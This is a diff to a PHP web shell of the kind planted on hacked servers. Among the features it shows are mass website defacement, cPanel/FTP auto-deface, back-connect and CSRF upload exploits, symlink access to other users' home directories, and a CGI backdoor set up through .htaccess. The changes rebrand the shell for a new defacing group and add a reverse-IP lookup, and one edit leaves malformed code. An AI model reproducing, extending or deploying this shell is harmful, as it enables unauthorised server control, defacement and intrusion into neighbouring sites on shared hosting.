@@ -1,6 +1,4 @@
 <?php
-
-
 session_start();
 error_reporting(0);
 set_time_limit(0);
@@ -12,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
  
-$auth_pass = "5f2f01d9c8e02d271ad9f762604b9155";
+$auth_pass = "263047db41751328681fe015003558db";
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -450,6 +448,7 @@ echo "<li> <a style='border:2px solid #0F6516;width:80px;padding:0px 8px 0px 8px
 echo "<li> <a style='border:2px solid #0F6516;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> </li>";
 echo "<li> <a style='border:2px solid #0F6516;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> </li>";
 echo "<p>";
+echo "<li> <a style='border:2px solid #0F6516;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=reverse_ip'>Reverse IP</a> </li>";
 echo "<li> <a style='border:2px solid #0F6516;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=defacerid'>DefacerID</a> </li>";
 echo "<li> <a style='border:2px solid #0F6516;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=csrf'>CSRF Online</a> </li>";
 echo "<li> <a style='border:2px solid #0F6516;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=backconnect'>Back Connect</a> </li>";
@@ -582,7 +581,7 @@ if($_GET['logout'] == true) {
     <font style='text-decoration: underline;'>Filename:</font><br>
     <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
     <font style='text-decoration: underline;'>Index File:</font><br>
-    <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Nusantara BlackHat</textarea><br>
+    <textarea name='script' style='width: 450px; height: 200px;'>Hacked By The WTJ</textarea><br>
     <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
     </form></center>";
     }
@@ -1363,6 +1362,12 @@ if($_GET['logout'] == true) {
         </form>";
     }
     echo "</center>";
+}
+elseif(isset($_GET['do']) && ($_GET['do'] == 'reverse_ip')){
+?>
+<br>
+<center><div id="sitelist"><a onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>"><div id='menu'>[ Reverse IP Lookup ] </a></center>
+<br>
 }elseif($_GET['do'] == 'defacerid') {
 echo "<center><form method='POST' action=''>
 <br>
@@ -1518,7 +1523,7 @@ $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
 echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
 <td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
 <td>".$user['name']."</td>
-<td><a href='$full/nb_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
+<td><a href='$full/the_wtj_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
 flush();
 $dcount++;}}}
 echo "</table>";
@@ -1790,10 +1795,10 @@ elseif($_GET['do'] == 'csrf') {
 <title>CSRF EXPLOITER ONLINE</title>
 <center><br><br><h2> CSRF ONLINE</h2>
 <br><br>
+<img src="http://www.sman7pekanbaru.sch.id/w.png" width="300px" height="300px"
 <font color=lime>*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc
 <center>
 <form method="post">
-<img src="http://www.sman7pekanbaru.sch.id/w.png" width="300px" height="300px"
 URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
 POST File: <input type="text" name="data" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
 <input type="submit" name="go" value="Lock!">
@@ -1973,8 +1978,8 @@ echo"</textarea><br><br>";
 } 
 /////////////////////////////
 elseif($_GET['do'] == 'cgi') {
-    $cgi_dir = mkdir('idx_cgi', 0755);
-    $file_cgi = "idx_cgi/cgi.izo";
+    $cgi_dir = mkdir('the_wtj_config', 0755);
+    $file_cgi = "the_wtj_cgi/cgi.izo";
     $isi_htcgi = "AddHandler cgi-script .izo";
     $htcgi = fopen(".htaccess", "w");
     fwrite($htcgi, $isi_htcgi);
@@ -1984,7 +1989,7 @@ elseif($_GET['do'] == 'cgi') {
     fwrite($cgi, $cgi_script);
     fclose($cgi);
     chmod($file_cgi, 0755);
-    echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
+    echo "<iframe src='the_wtj_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
 } elseif($_GET['do'] == 'fake_root') {
     ob_start();
     $cwd = getcwd();
@@ -2018,7 +2023,7 @@ elseif($_GET['do'] == 'cgi') {
         $ch = curl_init();
               curl_setopt($ch, CURLOPT_URL, $url);
               curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+               curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
               curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
               curl_setopt($ch, CURLOPT_FILE, $fp);
         return curl_exec($ch);
